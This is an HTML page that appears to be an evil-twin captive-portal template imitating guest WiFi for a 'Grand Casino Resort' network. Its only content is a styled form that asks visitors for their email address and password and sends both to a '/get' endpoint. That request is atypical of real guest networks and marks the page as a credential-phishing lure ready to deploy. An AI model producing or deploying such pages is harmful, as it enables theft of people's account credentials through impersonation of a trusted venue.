<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Grand Casino Resort — Guest WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#0a0a0a;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px;background:#111;border-radius:4px;overflow:hidden;box-shadow:0 30px 80px rgba(0,0,0,0.8);border:1px solid #2a2010}
.gold-top{height:2px;background:linear-gradient(90deg,#8B6010,#C4A050,#FFD700,#C4A050,#8B6010)}
.top{padding:30px 28px 22px;text-align:center;border-bottom:1px solid #2a2010}
.diamonds{font-size:16px;color:#C4A050;letter-spacing:6px;margin-bottom:10px}
.casino-name{font-size:22px;font-weight:300;color:#e8d8a0;letter-spacing:5px;text-transform:uppercase}
.casino-sub{font-size:8.5px;color:#6a5020;letter-spacing:3.5px;text-transform:uppercase;margin-top:6px}
.ssid-row{background:#0a0a0a;padding:7px 28px;display:flex;align-items:center;gap:8px;border-bottom:1px solid #2a2010}
.dot{width:6px;height:6px;background:#4ade80;border-radius:50%}
.ssid-row span{font-size:11px;color:#4a3a10}
.ssid-row strong{color:#8a7030;font-weight:400}
.body{padding:26px 28px 22px}
h2{font-size:15px;font-weight:400;color:#c0a860;letter-spacing:1px;margin-bottom:4px}
.sub{font-size:12px;color:#4a3a10;margin-bottom:18px}
.lbl{display:block;font-size:9px;font-weight:400;text-transform:uppercase;letter-spacing:2px;color:#5a4a20;margin-bottom:8px;margin-top:20px}
input{width:100%;padding:11px 0;border:none;border-bottom:1px solid #2a2010;background:transparent;font-size:14px;color:#c0a860;outline:none}
input:focus{border-bottom-color:#C4A050}
input::placeholder{color:#2a2010}
.btn{width:100%;padding:13px;margin-top:26px;border:1px solid #C4A050;background:transparent;color:#C4A050;font-size:10px;font-weight:300;letter-spacing:4px;text-transform:uppercase;cursor:pointer;transition:all .2s}
.btn:hover{background:#C4A050;color:#0a0a0a}
.terms{font-size:10px;color:#3a2a10;text-align:center;margin-top:16px;line-height:1.7}
.terms a{color:#6a5020}
.foot{border-top:1px solid #2a2010;padding:12px 28px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:9.5px;color:#3a2a10;text-decoration:none;letter-spacing:1px;text-transform:uppercase}
.foot a{color:#5a4a20}
.gold-top-2{height:1px;background:linear-gradient(90deg,transparent,#C4A050,transparent)}
</style>
</head>
<body>
<div class="card">
  <div class="gold-top"></div>
  <div class="top">
    <div class="diamonds">♦ ♣ ♠ ♥</div>
    <div class="casino-name">Grand</div>
    <div class="casino-sub">Casino &bull; Resort &bull; Hotel</div>
    <div class="gold-top-2" style="margin-top:14px"></div>
  </div>
  <div class="ssid-row"><div class="dot"></div><span>Network: <strong>GrandCasino-Guest</strong></span></div>
  <div class="body">
    <h2>Guest Network Access</h2>
    <p class="sub">Complimentary WiFi for all resort guests and visitors.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="your@email.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="••••••••" required>
      <button type="submit" class="btn">Connect</button>
      <p class="terms">By accessing the network you agree to the <a href="#">Terms of Use</a>. Must be 21+ to enter casino floor.</p>
    </form>
  </div>
  <div class="gold-top"></div>
  <div class="foot"><span>Grand Resort</span><a href="#">Concierge</a></div>
</div>
</body>
</html>
